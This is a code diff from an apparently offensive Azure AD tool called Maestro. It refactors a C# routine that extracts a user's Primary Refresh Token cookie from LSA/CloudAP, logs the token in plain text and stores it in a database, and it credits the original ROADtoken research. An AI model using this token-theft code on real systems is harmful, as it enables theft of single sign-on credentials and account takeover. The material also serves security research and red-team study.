@@ -1,4 +1,10 @@
-﻿using System;
+﻿//
+// Dirk-jan Mollema (@_dirkjan) is the original author of this file. Thanks, Dirk-jan!
+// https://github.com/dirkjanm/ROADtoken
+// https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
+//
+
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Text.RegularExpressions;
@@ -7,10 +13,9 @@ namespace Maestro
 {
     class ROADToken
     {
-        public static string GetXMsRefreshtokencredential(string nonce = null)
+        public static PrtCookie GetPrtCookie(LiteDBHandler database, string nonce = null)
         {
-            //RefreshToken xMsRefreshtokencredential = null;
-            string xMsRefreshtokencredential = null;
+            PrtCookie prtCookie = null;
 
             Logger.Info("Requesting PRT cookie" + (nonce != null ? " with nonce " : " ") + "for this user/device from LSA/CloudAP");
 
@@ -93,9 +98,10 @@ namespace Maestro
                     Logger.Error("Failed to obtain x-Ms-Refreshtokencredential" + (nonce != null ? " with nonce " : " "));
                     return null;
                 }
-                xMsRefreshtokencredential = match.Groups[1].Value;
+                string xMsRefreshtokencredential = match.Groups[1].Value;
                 Logger.Info($"Obtained x-Ms-Refreshtokencredential" + (nonce != null ? " with nonce" : " ") + $": {xMsRefreshtokencredential}");
-                return xMsRefreshtokencredential;
+                prtCookie = new PrtCookie(xMsRefreshtokencredential, database);
+                return prtCookie;
             }
         }
     }
